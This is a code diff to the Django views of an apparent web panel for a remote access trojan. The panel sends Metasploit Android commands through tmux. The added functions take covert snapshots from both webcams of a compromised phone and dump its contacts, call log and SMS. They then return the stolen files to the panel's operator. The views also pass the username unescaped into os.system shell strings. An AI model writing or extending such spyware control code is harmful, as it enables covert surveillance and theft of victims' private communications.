@@ -78,12 +78,43 @@ def startlisten(request):
 
 def webcamsnap(request):
     username = request.user.username
-    dir = '/root/django/users/'+ str(username)+'/'
+    dir = '/root/django/users/'+ str(username)+'/webcamsnap1.jpg'
 
+    os.system('tmux send-keys -t '+str(username)+' "webcam_snap -i 1 -o '+str(dir)+'""\n"')
     os.system('tmux send-keys -t '+str(username)+' "webcam_snap -o '+str(dir)+'""\n"')
-    os.system('tmux send-keys -t '+str(username)+' "webcam_snap -o '+str(dir)+'""\n"')
+
+##down
+    username = request.user.username
+    file_path = dir
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as fh:
+            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
+            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
+            return response
+
+
 
     return redirect('RAT:msf/android/listen')
+
+def webcamsnap2(request):
+    username = request.user.username
+    dir = '/root/django/users/'+ str(username)+'/webcamsnap2.jpg'
+
+    os.system('tmux send-keys -t '+str(username)+' "webcam_snap -i 2 -o '+str(dir)+'""\n"')
+
+##down
+    username = request.user.username
+    file_path = dir
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as fh:
+            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
+            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
+            return response
+
+
+
+    return redirect('RAT:msf/android/listen')
+
 
 def dumpsms(request):
     username = request.user.username
@@ -107,6 +138,14 @@ def dumpcontacts(request):
     dir = '/root/django/users/'+ str(username)+'/dumpcontacts.txt'
 
     os.system('tmux send-keys -t '+str(username)+' "dump_contacts -o '+str(dir)+'""\n"')
+##down
+    username = request.user.username
+    file_path = dir
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as fh:
+            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
+            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
+            return response
 
     return redirect('RAT:msf/android/listen')
 
@@ -115,6 +154,14 @@ def dumpcalllog(request):
     dir = '/root/django/users/'+ str(username)+'/dumpcalllog.txt'
 
     os.system('tmux send-keys -t '+str(username)+' "dump_calllog -o '+str(dir)+'""\n"')
+##down
+    username = request.user.username
+    file_path = dir
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as fh:
+            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
+            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
+            return response
 
     return redirect('RAT:msf/android/listen')
 
